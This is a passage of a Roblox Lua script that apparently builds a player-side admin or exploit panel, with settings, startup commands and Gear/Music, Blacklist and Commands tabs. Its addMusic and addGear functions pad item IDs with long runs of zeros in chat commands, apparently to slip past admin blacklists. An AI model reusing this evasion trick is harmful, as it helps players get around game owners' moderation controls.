TextLabel_9.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true
TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left

BoxFrame_3.Name = "BoxFrame"
BoxFrame_3.Parent = PrefixFrame
guielements[#guielements+1] = BoxFrame_3
BoxFrame_3.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BoxFrame_3.Position = UDim2.new(1, -60, 0, 0)
BoxFrame_3.Size = UDim2.new(0, 60, 1, 0)

UICorner_19.Parent = BoxFrame_3

TextBox_3.Parent = BoxFrame_3
TextBox_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
guielements[#guielements+1] = TextBox_3
TextBox_3.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_3.BorderSizePixel = 2
TextBox_3.Position = UDim2.new(0, 1, 0, 1)
TextBox_3.Size = UDim2.new(1, -2, 1, -2)
TextBox_3.Font = Enum.Font.SourceSans
TextBox_3.Text = uidata.prefix
TextBox_3.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_3.TextScaled = true
TextBox_3.TextSize = 14.000
TextBox_3.TextWrapped = true

UICorner_20.CornerRadius = UDim.new(0, 3)
UICorner_20.Parent = TextBox_3

FpsBoostFrame.Name = "FpsBoostFrame"
FpsBoostFrame.Parent = Options_2
FpsBoostFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FpsBoostFrame.BackgroundTransparency = 1.000
FpsBoostFrame.Size = UDim2.new(0, 100, 0, 100)

TextLabel_10.Parent = FpsBoostFrame
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Size = UDim2.new(1, 0, 1, 0)
TextLabel_10.Font = Enum.Font.SourceSans
TextLabel_10.Text = "Fps Booster:"
guielements[#guielements+1] = TextLabel_10
TextLabel_10.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true
TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left

Frame_5.Parent = FpsBoostFrame
guielements[#guielements+1] = Frame_5
Frame_5.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_5.Position = UDim2.new(1, -100, 0, 0)
Frame_5.Size = UDim2.new(0, 100, 1, 0)

TextButton_6.Parent = Frame_5
TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.Position = UDim2.new(0, 1, 0, 1)
TextButton_6.Size = UDim2.new(1, -2, 1, -2)
TextButton_6.ZIndex = 2
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Disabled"
guielements[#guielements+1] = TextButton_6
TextButton_6.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
boolbuttons['fpsboost'] = TextButton_6

UICorner_21.Parent = TextButton_6

UICorner_22.Parent = Frame_5

Option3_5.Name = "Option3"
Option3_5.Parent = Options_2
Option3_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_5.BackgroundTransparency = 1.000
Option3_5.Size = UDim2.new(0, 100, 0, 100)

TextLabel_11.Parent = Option3_5
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Size = UDim2.new(1, 0, 1, 0)
TextLabel_11.Font = Enum.Font.SourceSans
TextLabel_11.Text = "Startup Commands:"
guielements[#guielements+1] = TextLabel_11
TextLabel_11.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true
TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left

Frame_6.Parent = Option3_5
guielements[#guielements+1] = Frame_6
Frame_6.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_6.Position = UDim2.new(1, -100, 0, 0)
Frame_6.Size = UDim2.new(0, 100, 3.5, 0)

UICorner_23.Parent = Frame_6

Frame_7.Parent = Frame_6
Frame_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_7.BorderSizePixel = 0
Frame_7.ClipsDescendants = true
Frame_7.Position = UDim2.new(0, 1, 0, 1)
Frame_7.Size = UDim2.new(1, -2, 1, -2)

ScrollingFrame.Parent = Frame_7
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0)
ScrollingFrame.ScrollBarThickness = 5

TextBox_4.Parent = ScrollingFrame
TextBox_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_4.BackgroundTransparency = 1.000
TextBox_4.Position = UDim2.new(0.0250000004, 0, 0, 0)
TextBox_4.Size = UDim2.new(0.899999976, 0, 1, 0)
TextBox_4.ClearTextOnFocus = false
TextBox_4.Font = Enum.Font.SourceSans
TextBox_4.MultiLine = true
TextBox_4.Text = table.concat(uidata.startupcmds, '\n')
guielements[#guielements+1] = TextBox_4
TextBox_4.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_4.TextSize = 14.000
TextBox_4.TextXAlignment = Enum.TextXAlignment.Left
TextBox_4.TextYAlignment = Enum.TextYAlignment.Top
TextBox_4.FocusLost:Connect(function()
	uidata.startupcmds = TextBox_4.Text:split('\n')
	updatefile()
end)
TextBox_4:GetPropertyChangedSignal('Text'):Connect(function()
	repeat wait(.5) TextBox.TextSize = TextBox.TextSize + 1 until not TextBox.TextFits
	repeat wait(.5) TextBox.TextSize = TextBox.TextSize - 1 until TextBox.TextFits
end)

Option3_6.Name = "Option3"
Option3_6.Parent = Options_2
Option3_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_6.BackgroundTransparency = 1.000
Option3_6.Size = UDim2.new(0, 100, 0, 100)

Option3_7.Name = "Option3"
Option3_7.Parent = Options_2
Option3_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_7.BackgroundTransparency = 1.000
Option3_7.Size = UDim2.new(0, 100, 0, 100)

Startupcmds.Name = "Startupcmds"
Startupcmds.Parent = Options_2
Startupcmds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Startupcmds.BackgroundTransparency = 1.000
Startupcmds.Size = UDim2.new(0, 100, 0, 100)

TextLabel_12.Parent = Startupcmds
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.Size = UDim2.new(1, 0, 1, 0)
TextLabel_12.Font = Enum.Font.SourceSans
TextLabel_12.Text = "Run Startup Commands:"
guielements[#guielements+1] = TextLabel_12
TextLabel_12.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_12.TextScaled = true
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true
TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left


Frame_8.Parent = Startupcmds
Frame_8.Name = 'BoolFrame'
guielements[#guielements+1] = Frame_8
Frame_8.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_8.Position = UDim2.new(1, -100, 0, 0)
Frame_8.Size = UDim2.new(0, 100, 1, 0)

TextButton_7.Parent = Frame_8
TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.Position = UDim2.new(0, 1, 0, 1)
TextButton_7.Size = UDim2.new(1, -2, 1, -2)
TextButton_7.ZIndex = 2
guielements[#guielements+1] = TextButton_7
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "Disabled"
TextButton_7.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
boolbuttons['startupcmdsenabled'] = TextButton_7

UICorner_24.Parent = TextButton_7

UICorner_25.Parent = Frame_8

Option3_8.Name = "Option3"
Option3_8.Parent = Options_2
Option3_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Option3_8.BackgroundTransparency = 1.000
Option3_8.Size = UDim2.new(0, 100, 0, 100)

BackColor.Name = "BackColor"
BackColor.Parent = Option3_8
BackColor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BackColor.BackgroundTransparency = 1.000
BackColor.Size = UDim2.new(1, 0, 1, 0)
BackColor.Font = Enum.Font.SourceSans
BackColor.Text = "Gui Color:"
guielements[#guielements+1] = BackColor
BackColor.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BackColor.TextScaled = true
BackColor.TextSize = 14.000
BackColor.TextWrapped = true
BackColor.TextXAlignment = Enum.TextXAlignment.Left

BoxFrame_4.Name = "BoxFrame"
BoxFrame_4.Parent = Option3_8
guielements[#guielements+1] = BoxFrame_4
BoxFrame_4.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BoxFrame_4.Position = UDim2.new(1, -113, 0, 0)
BoxFrame_4.Size = UDim2.new(0, 60, 1, 0)

UICorner_26.Parent = BoxFrame_4

TextBox_5.Parent = BoxFrame_4
TextBox_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
guielements[#guielements+1] = TextBox_5
TextBox_5.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_5.BorderSizePixel = 2
TextBox_5.Position = UDim2.new(0, 1, 0, 1)
TextBox_5.Size = UDim2.new(1, -2, 1, -2)
TextBox_5.Font = Enum.Font.SourceSans
TextBox_5.Text = "R G B"
TextBox_5.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBox_5.TextScaled = true
TextBox_5.TextSize = 14.000
TextBox_5.TextTransparency = 0.600
TextBox_5.TextWrapped = true

UICorner_27.CornerRadius = UDim.new(0, 3)
UICorner_27.Parent = TextBox_5

Frame_9.Parent = Option3_8
guielements[#guielements+1] = Frame_9
Frame_9.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_9.Position = UDim2.new(1, -50, 0, 0)
Frame_9.Size = UDim2.new(0, 50, 1, 0)

TextButton_8.Parent = Frame_9
TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.Position = UDim2.new(0, 1, 0, 1)
TextButton_8.Size = UDim2.new(1, -2, 1, -2)
TextButton_8.ZIndex = 2
TextButton_8.Font = Enum.Font.SourceSans
TextButton_8.Text = "Set"
guielements[#guielements+1] = TextButton_8
TextButton_8.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.MouseButton1Click:Connect(function()
	local split = TextBox_5.Text:split(' ')
	if #split ~= 3 then
		uidata.backgroundcolor = {r = 255,g = 255,b = 255}
		return
	end
	local r = tonumber(split[1])
	local g = tonumber(split[2])
	local b = tonumber(split[3])
	if r and g and b then
		uidata.backgroundcolor = {r = r,g = g,b = b}
	else
		uidata.backgroundcolor = {r = 255,g = 255,b = 255}
	end
	setGuiColor()
	updatefile()
end)
--setguicolor


UICorner_28.Parent = TextButton_8

UICorner_29.Parent = Frame_9




local cornerboi = Instance.new('Frame', Main)
cornerboi.Name = "Tablist"
cornerboi.Parent = Main
guielements[#guielements+1] = cornerboi
cornerboi.Active = true
cornerboi.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
cornerboi.BackgroundTransparency = 0
cornerboi.BorderSizePixel = 0
cornerboi.Size = UDim2.new(1, 0, 0.150000006, 0)


Tablist.Name = "Tablist"
Tablist.Parent = cornerboi
guielements[#guielements+1] = Tablist
Tablist.Active = true
Tablist.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Tablist.BackgroundTransparency = 0
Tablist.ScrollBarImageColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Tablist.BorderSizePixel = 0
Tablist.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Tablist.Size = UDim2.new(1, -4, 1, -4)
Tablist.Position = UDim2.new(0, 2, 0, 2)
Tablist.CanvasSize = UDim2.new(1.5, 0, 0, 0)
Tablist.ScrollBarThickness = 7
Tablist.ScrollingDirection = Enum.ScrollingDirection.X
Tablist.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left


-- Gui to Lua
-- Version: 3.2

-- Instances:


--[[
local Frame22 = Instance.new("Frame")
local UICorner22 = Instance.new("UICorner")
local Frame_222 = Instance.new("Frame")
local UICorner_222 = Instance.new("UICorner")

--Properties:

Frame22.Parent = Tablist.Parent
Frame22.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame22.Size = UDim2.new(0, 100, 0, 100)

UICorner22.Parent = Frame22

Frame_222.Parent = Frame22
Frame_222.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_222.Position = UDim2.new(0, 1, 0, 1)
Frame_222.Size = UDim2.new(1, -2, 1, -2)
Frame_222.BorderSizePixel = 0

UICorner_222.Parent = Frame_222

local function NUIRT_fake_script() -- Frame_2.script 
	local script = Instance.new('LocalScript', Frame_222)

	local bar = script.Parent.Parent
	local rs = game:GetService'RunService'
	local ui = game:GetService('UserInputService')
	local scrollinfo = TweenInfo.new(.3)
	local tween = game:GetService('TweenService')
	local scrolly = Tablist
	local m = game:GetService('Players').LocalPlayer:GetMouse()
	function isHoveringOverObj(obj)
		local tx = obj.AbsolutePosition.X
		local ty = obj.AbsolutePosition.Y
		local bx = tx + obj.AbsoluteSize.X
		local by = ty + obj.AbsoluteSize.Y
		if m.X >= tx and m.Y >= ty and m.X <= bx and m.Y <= by then
			return true
		end
	end
	scrolly.Changed:Connect(function()
		local size = (scrolly.CanvasSize.X.Offset/scrolly.AbsoluteSize.X)
        local yy = math.min(scrolly.AbsoluteSize.X/size-6, scrolly.AbsoluteSize.X-5)
        local y = math.max(yy, 20)
		bar.Size = UDim2.new(0, 8, 0, y+2)
		tween:Create(bar, TweenInfo.new(.05), {Position = UDim2.new(0, scrolly.CanvasPosition.X/size, 0, 0)}):Play()
	end)
end
coroutine.wrap(NUIRT_fake_script)()]]

UICorner_32.Parent = Tablist

UIListLayout.Parent = Tablist
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 1)

LogsBtn.Name = "LogsBtn"
LogsBtn.Parent = Tablist
LogsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LogsBtn.BackgroundTransparency = 0.500
LogsBtn.Size = UDim2.new(0, 98, 0.75, 0)
LogsBtn.Font = Enum.Font.SourceSans
LogsBtn.Text = "Logs"

guielements[#guielements+1] = LogsBtn
LogsBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
LogsBtn.TextScaled = true
LogsBtn.TextSize = 14.000
LogsBtn.TextWrapped = true

UICorner_33.CornerRadius = UDim.new(0, 4)
UICorner_33.Parent = LogsBtn

GeneralBtn.Name = "GeneralBtn"
GeneralBtn.Parent = Tablist
GeneralBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GeneralBtn.BackgroundTransparency = 0.500
GeneralBtn.Size = UDim2.new(0, 98, 0.75, 0)
GeneralBtn.Font = Enum.Font.SourceSans
GeneralBtn.Text = "General"
GeneralBtn.BorderSizePixel = 0

guielements[#guielements+1] = GeneralBtn
GeneralBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
GeneralBtn.TextScaled = true
GeneralBtn.TextSize = 14.000
GeneralBtn.TextWrapped = true
local grid = Instance.new('UIGridLayout', General)
grid.Parent = General
grid.SortOrder = Enum.SortOrder.LayoutOrder
grid.CellPadding = UDim2.new(0, 1, 0, 15)
grid.CellSize = UDim2.new(.24, 0, 0, 25)
local grid = Instance.new('UIGridLayout', Gear)
grid.SortOrder = Enum.SortOrder.LayoutOrder
grid.CellPadding = UDim2.new(0, 1, 0, 15)
grid.CellSize = UDim2.new(.24, 0, 0, 25)
local grid = Instance.new('UIListLayout', CmdList)
grid.SortOrder = Enum.SortOrder.LayoutOrder

UICorner_34.CornerRadius = UDim.new(0, 4)
UICorner_34.Parent = GeneralBtn

GnABtn.Name = "GnABtn"
GnABtn.Parent = Tablist
GnABtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GnABtn.BackgroundTransparency = 0.500
GnABtn.Size = UDim2.new(0, 98, 0.75, 0)
GnABtn.Font = Enum.Font.SourceSans
GnABtn.Text = "Gear/Music"

BlacklistBtn.Name = "BlacklistBtn"
BlacklistBtn.Parent = Tablist
BlacklistBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlacklistBtn.BorderSizePixel = 0
BlacklistBtn.BackgroundTransparency = 0.500
BlacklistBtn.Size = UDim2.new(0, 98, 0.75, 0)
BlacklistBtn.Font = Enum.Font.SourceSans
BlacklistBtn.Text = "Blacklist"



local Frame = Instance.new("Frame")
local Topbar2 = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local Gear = Instance.new("TextButton")
local Music = Instance.new("TextButton")
local MusicContainer = Instance.new("ScrollingFrame")
local MusicGrid = Instance.new("UIGridLayout")
local GearContainer = Instance.new("ScrollingFrame")
local GearGrid = Instance.new("UIGridLayout")
guielements[#guielements+1] = Topbar2
guielements[#guielements+1] = Music
guielements[#guielements+1] = Gear
guielements[#guielements+1] = Frame
MusicContainer.Name = "MusicContainer"
MusicContainer.Parent = Frame
MusicContainer.Active = true
MusicContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MusicContainer.BackgroundTransparency = 0.600
MusicContainer.BorderSizePixel = 0
MusicContainer.Position = UDim2.new(0, 1, 0, 40)
MusicContainer.Size = UDim2.new(1, 0, 1, -40)
MusicContainer.Visible = false
MusicContainer.CanvasSize = UDim2.new(0, 0, 0, 0)

MusicGrid.Name = "MusicGrid"
MusicGrid.Parent = MusicContainer
MusicGrid.SortOrder = Enum.SortOrder.LayoutOrder
MusicGrid.CellPadding = UDim2.new(0, 6, 0, 2)
MusicGrid.CellSize = UDim2.new(0.321999997, 0, 0, 30)

GearContainer.Name = "GearContainer"
GearContainer.Parent = Frame
GearContainer.Active = true
GearContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GearContainer.BackgroundTransparency = 0.600
GearContainer.BorderSizePixel = 0
GearContainer.Position = UDim2.new(0, 1, 0, 40)
GearContainer.Size = UDim2.new(1, 0, 1, -40)
GearContainer.CanvasSize = UDim2.new(0, 0, 0, 0)

GearGrid.Name = "GearGrid"
GearGrid.Parent = GearContainer
GearGrid.SortOrder = Enum.SortOrder.LayoutOrder
GearGrid.CellPadding = UDim2.new(0, 6, 0, 2)
GearGrid.CellSize = UDim2.new(0.321999997, 0, 0, 30)


Frame.Parent = GnACont
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundTransparency = 1

Topbar2.Name = "Topbar"
Topbar2.Parent = Frame
Topbar2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Topbar2.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Topbar2.Size = UDim2.new(1, 0, 0, 25)
Topbar2.BackgroundTransparency = 0

UIGridLayout.Parent = Topbar2
UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 120, 1, 0)

Gear.Name = "Gear"
Gear.Parent = Topbar2
Gear.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
Gear.BackgroundTransparency = 1
Gear.Size = UDim2.new(0, 200, 0, 50)
Gear.Font = Enum.Font.SourceSans
Gear.Text = "Gear"
Gear.TextScaled = true
Gear.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Gear.TextSize = 14.000


Music.Name = "Music"
Music.Parent = Topbar2
Music.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
Music.BackgroundTransparency = 1
Music.Size = UDim2.new(0, 200, 0, 50)
Music.Font = Enum.Font.SourceSans
Music.Text = "Music"
Music.TextScaled = true
Music.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Music.TextSize = 14.000


local bar = Topbar2
local musiccont = bar.Parent:WaitForChild('MusicContainer')
local gearcont = bar.Parent:WaitForChild('GearContainer')
local musicgrid = musiccont:WaitForChild('MusicGrid')
local geargrid = gearcont:WaitForChild('GearGrid')
local musicbtn = bar:WaitForChild('Music')
local gearbtn = bar:WaitForChild('Gear')


local btnframe = Instance.new('Frame')

local corner = Instance.new('UICorner', btnframe)
corner.CornerRadius = UDim.new(0, 3)
btnframe.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
btnframe.BackgroundTransparency = 0
btnframe.BorderSizePixel = 0

local button = Instance.new('TextButton', btnframe)
button.Name = 'button'
button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button.Size = UDim2.new(1, -4, 1, -4)
button.Position = UDim2.new(0, 2, 0, 2)
button.BackgroundTransparency = 0
button.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
button.TextScaled = true
button.BorderSizePixel = 0
local corner = Instance.new('UICorner', button)
corner.CornerRadius = UDim.new(0, 3)

musicgrid:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function(old)
	musiccont.CanvasSize = UDim2.new(1, 0, 0, musicgrid.AbsoluteContentSize.Y)
end)
geargrid:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function(old)
	gearcont.CanvasSize = UDim2.new(1, 0, 0, geargrid.AbsoluteContentSize.Y)
end)


function addMusic(text, id)
	local btn = btnframe:Clone()
	btn.Parent = musiccont
	btn.button.Text = text
	btn.button.MouseButton1Click:Connect(function()
		plrs:Chat('music 00000000000000000000000000000000000000000'..id)
	end)
	guielements[#guielements+1] = btn.button
	guielements[#guielements+1] = btn
end
function addGear(text, ids)
	local btn = btnframe:Clone()
	btn.Parent = gearcont
	btn.button.Text = text
	btn.button.MouseButton1Click:Connect(function()
		for i,v in pairs(ids) do
			plrs:Chat('gear me 0000000000000000000000000000000000'..v)
		end
	end)
	guielements[#guielements+1] = btn.button
	guielements[#guielements+1] = btn
end
musicbtn.MouseButton1Click:Connect(function()
	gearcont.Visible = false
	musiccont.Visible = true
end)
gearbtn.MouseButton1Click:Connect(function()
	gearcont.Visible = true
	musiccont.Visible = false
end)

guielements[#guielements+1] = GnABtn
GnABtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
GnABtn.TextScaled = true
GnABtn.TextSize = 14.000
GnABtn.TextWrapped = true


guielements[#guielements+1] = BlacklistBtn
BlacklistBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
BlacklistBtn.TextScaled = true
BlacklistBtn.TextSize = 14.000
BlacklistBtn.TextWrapped = true


local grid = Instance.new('UIGridLayout')
grid.Parent = General
grid.SortOrder = Enum.SortOrder.LayoutOrder
grid.CellPadding = UDim2.new(0, 1, 0, 15)
grid.CellSize = UDim2.new(.24, 0, 0, 25)

UICorner_34.CornerRadius = UDim.new(0, 4)
UICorner_34.Parent = GnABtn

CommandsBtn.Name = "CommandsBtn"
CommandsBtn.Parent = Tablist
CommandsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CommandsBtn.BackgroundTransparency = 0.500
CommandsBtn.Size = UDim2.new(0, 98, 0.75, 0)
CommandsBtn.Font = Enum.Font.SourceSans
guielements[#guielements+1] = CommandsBtn
CommandsBtn.Text = "Commands"
CommandsBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
CommandsBtn.TextScaled = true
CommandsBtn.TextSize = 14.000
CommandsBtn.TextWrapped = true

UICorner_35.CornerRadius = UDim.new(0, 4)
UICorner_35.Parent = CommandsBtn

ChatSettingsBtn.Name = "ChatSettingsBtn"
ChatSettingsBtn.Parent = Tablist
ChatSettingsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ChatSettingsBtn.BackgroundTransparency = 0.500
ChatSettingsBtn.Size = UDim2.new(0, 98, 0.75, 0)
ChatSettingsBtn.Font = Enum.Font.SourceSans
guielements[#guielements+1] = ChatSettingsBtn
ChatSettingsBtn.Text = "Chat Settings"
ChatSettingsBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
ChatSettingsBtn.TextScaled = true
ChatSettingsBtn.TextSize = 14.000
ChatSettingsBtn.TextWrapped = true

UICorner_36.CornerRadius = UDim.new(0, 4)
UICorner_36.Parent = ChatSettingsBtn

SettingsBtn.Name = "SettingsBtn"
SettingsBtn.Parent = Tablist
SettingsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SettingsBtn.BackgroundTransparency = 0.500
SettingsBtn.Size = UDim2.new(0, 98, 0.75, 0)
SettingsBtn.Font = Enum.Font.SourceSans
guielements[#guielements+1] = SettingsBtn
SettingsBtn.Text = "Settings"
SettingsBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
SettingsBtn.TextScaled = true
SettingsBtn.TextSize = 14.000
SettingsBtn.TextWrapped = true

UICorner_37.CornerRadius = UDim.new(0, 4)
UICorner_37.Parent = SettingsBtn



local grid = Instance.new('UIGridLayout', Tablist)
grid.SortOrder = Enum.SortOrder.LayoutOrder
grid.CellPadding = UDim2.new(0, 1, 0, 15)
grid.CellSize = UDim2.new(0, 150, 0, 25)
Tablist.CanvasSize = UDim2.new(0, 152*((#Tablist:GetChildren()-1)/2), 0, 0)

UICorner_38.CornerRadius = UDim.new(0, 3)
UICorner_38.Parent = Corner
function setGuiColor(color)
	for i,v in pairs(guielements) do
		if v:IsA('ScrollingFrame') then
			v.ScrollBarImageColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			v.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
		end
		if v then
			if (v:IsA('TextLabel') or v:IsA('TextBox') or v:IsA('TextButton')) and (v.Parent and v.Parent.Name ~= 'BoolFrame') then
				v.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
				v.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			else
				if v.BackgroundColor3 ~= Color3.fromRGB(0, 0, 0) then
					v.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
					v.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
				elseif v.Name == 'Topbar' then
					v.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
				end
			end
		end
	end
	updatefile()
end

for i,btn in pairs(boolbuttons) do
	btn.MouseButton1Click:Connect(function()
		if btn.Text == 'Disabled' then
			if i == 'highlightplayer' then
				local user = getplayer(TextBox_2.Text)
				local index = table.find(uidata.highlightedusers, user.UserId)
				if user and not index then
					uidata.highlightedusers[#uidata.highlightedusers+1] = user.UserId
					print('added '..user.Name)
				end
			end
			btn.Text = 'Enabled'
			btn.TextColor3 = Color3.fromRGB(0, 255, 0)
			btn.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			uidata[i] = true
		else
			if i == 'highlightplayer' then
